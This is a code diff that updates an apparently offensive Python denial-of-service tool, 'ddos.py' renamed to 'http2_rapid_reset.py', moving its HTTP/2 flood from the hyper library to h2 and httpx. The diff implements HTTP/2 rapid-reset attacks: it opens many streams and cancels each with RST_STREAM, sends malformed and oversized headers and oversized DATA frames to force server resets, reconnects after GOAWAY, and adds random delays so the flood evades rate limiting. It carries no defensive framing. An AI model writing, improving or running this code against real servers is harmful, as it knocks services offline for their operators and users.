@@ -7,15 +7,15 @@ import ipaddress
 try:
     from scapy.all import IP, UDP, send, Raw
 except ImportError:
-    print("⚠️ Scapy not installed. Run: pip3 install scapy")
+    print("⚠️ Scapy not installed. Run: pip3 install scapy --user")
     sys.exit(1)
 
 try:
-    from hyper import HTTPConnection
-    from hyper.http20.frame import HeadersFrame, RstStreamFrame, SettingsFrame, GoAwayFrame, DataFrame
-    from hyper.http20.exceptions import HyperException
+    import httpx
+    from h2.connection import H2Connection
+    from h2.events import StreamReset, ConnectionTerminated
 except ImportError:
-    print("⚠️ Hyper not installed. Run: pip3 install hyper")
+    print("⚠️ httpx or h2 not installed. Run: pip3 install httpx\\[http2\\] --user")
     sys.exit(1)
 
 USE_TOR = False
@@ -65,7 +65,6 @@ def stealth_http_headers(malformed=False):
     }
     
     if malformed:
-        # Introduce invalid HPACK encoding or oversized headers
         headers[":invalid-header"] = os.urandom(1024).hex()  # Invalid pseudo-header
         headers["x-oversized"] = "A" * 8192  # Oversized header to trigger server reset
     return headers
@@ -176,10 +175,9 @@ def slow_post_flood(ip, port, duration, threads):
     run_threads(attack, threads, duration, "Slow POST (RUDY)")
 
 def http2_flood(ip, port, duration, threads):
-    def get_max_concurrent_streams(conn):
+    def get_max_concurrent_streams(h2_conn):
         try:
-            settings = conn._remote_settings
-            return settings.get('SETTINGS_MAX_CONCURRENT_STREAMS', 100)
+            return h2_conn.remote_settings.max_concurrent_streams
         except:
             return 100
 
@@ -194,84 +192,91 @@ def http2_flood(ip, port, duration, threads):
                 s = get_socket()
                 s = context.wrap_socket(s, server_hostname=ip)
                 s.connect((ip, port))
-                conn = HTTPConnection(ip, port=port, secure=True, ssl_context=context, socket=s)
-                return conn, s
+                client = httpx.Client(http2=True, verify=context)
+                h2_conn = H2Connection()
+                h2_conn.initiate_connection()
+                s.sendall(h2_conn.data_to_send())
+                return client, h2_conn, s
             except:
-                return None, None
+                return None, None, None
 
         for _ in range(MAX_CONNECTIONS_PER_THREAD):
-            conn, s = create_connection()
-            if conn and s:
-                connections.append((conn, s))
+            client, h2_conn, s = create_connection()
+            if client and h2_conn and s:
+                connections.append((client, h2_conn, s))
 
         if not connections:
             return
 
-        max_concurrent_streams = min(get_max_concurrent_streams(connections[0][0]), 100)
-        stream_ids = {conn: 1 for conn, _ in connections}
+        max_concurrent_streams = min(get_max_concurrent_streams(connections[0][1]), 100)
+        stream_ids = {h2_conn: 1 for _, h2_conn, _ in connections}
 
         while time.time() < end:
-            for i, (conn, s) in enumerate(connections[:]):
+            for i, (client, h2_conn, s) in enumerate(connections[:]):
                 try:
                     active_streams = 0
                     while active_streams < max_concurrent_streams and time.time() < end:
                         try:
-                            # Randomly choose attack tactic
+                            stream_id = stream_ids[h2_conn]
                             tactic = random.choice(["client_reset", "malformed_frame", "flow_control_error"])
                             
                             if tactic == "client_reset":
-                                # Standard rapid-reset with client-initiated RST_STREAM
                                 headers = stealth_http_headers(malformed=False)
-                                conn.request('GET', headers[':path'], headers=headers)
-                                rst_frame = RstStreamFrame(stream_ids[conn])
-                                rst_frame.error_code = 0x8  # CANCEL
-                                conn._send_frame(rst_frame)
+                                h2_conn.send_headers(stream_id, headers, end_stream=False)
+                                h2_conn.send_data(stream_id, b"", end_stream=True)
+                                h2_conn.reset_stream(stream_id, error_code=0x8)  # CANCEL
+                                s.sendall(h2_conn.data_to_send())
                             elif tactic == "malformed_frame":
-                                # Send malformed headers to trigger server RST_STREAM
                                 headers = stealth_http_headers(malformed=True)
-                                conn.request('GET', headers[':path'], headers=headers)
-                                # No client RST_STREAM; expect server to reset
+                                h2_conn.send_headers(stream_id, headers, end_stream=False)
+                                s.sendall(h2_conn.data_to_send())
                             elif tactic == "flow_control_error":
-                                # Send DATA frame exceeding flow control window
                                 headers = stealth_http_headers(malformed=False)
-                                conn.request('GET', headers[':path'], headers=headers)
-                                # Send oversized DATA frame to trigger server reset
-                                data_frame = DataFrame(stream_ids[conn])
-                                data_frame.data = os.urandom(16384)  # Exceed typical window size
-                                conn._send_frame(data_frame)
+                                h2_conn.send_headers(stream_id, headers, end_stream=False)
+                                h2_conn.send_data(stream_id, os.urandom(16384), end_stream=False)
+                                s.sendall(h2_conn.data_to_send())
 
-                            stream_ids[conn] += 2
+                            stream_ids[h2_conn] += 2
                             active_streams += 1
                             time.sleep(random.uniform(0.005, 0.05))  # Random delay to evade rate-limiting
-                        except HyperException as e:
-                            if "GOAWAY" in str(e):
-                                try:
-                                    s.close()
-                                except:
-                                    pass
-                                connections.pop(i)
-                                conn, s = create_connection()
-                                if conn and s:
-                                    connections.append((conn, s))
-                                    stream_ids[conn] = 1
-                                break
-                            else:
-                                break
-                        except socket.error:
+
+                            # Check for server responses (e.g., GOAWAY)
+                            data = s.recv(65535)
+                            if data:
+                                events = h2_conn.receive_data(data)
+                                for event in events:
+                                    if isinstance(event, ConnectionTerminated):
+                                        try:
+                                            s.close()
+                                            client.close()
+                                        except:
+                                            pass
+                                        connections.pop(i)
+                                        client, h2_conn, s = create_connection()
+                                        if client and h2_conn and s:
+                                            connections.append((client, h2_conn, s))
+                                            stream_ids[h2_conn] = 1
+                                        break
+                                    elif isinstance(event, StreamReset):
+                                        stream_ids[h2_conn] += 2
+                                        active_streams += 1
+                        except (httpx.HTTPError, socket.error):
                             break
                 except:
                     try:
                         s.close()
+                        client.close()
                     except:
                         pass
                     connections.pop(i)
-                    conn, s = create_connection()
-                    if conn and s:
-                        connections.append((conn, s))
-                        stream_ids[conn] = 1
-        for conn, s in connections:
+                    client, h2_conn, s = create_connection()
+                    if client and h2_conn and s:
+                        connections.append((client, h2_conn, s))
+                        stream_ids[h2_conn] = 1
+        for client, h2_conn, s in connections:
             try:
                 s.close()
+                client.close()
             except:
                 pass
 
@@ -366,7 +371,7 @@ def parse_trigger(args):
             print("Please enter 'y' for yes or 'n' for no.")
     else:
         if len(args) < 6:
-            print("Usage: python3 ddos.py <ip> <port> <duration> <threads> <mode> [--loop]")
+            print("Usage: python3 http2_rapid_reset.py <ip> <port> <duration> <threads> <mode> [--loop]")
             print(f"Modes: {', '.join(modes)}")
             sys.exit(1)
 
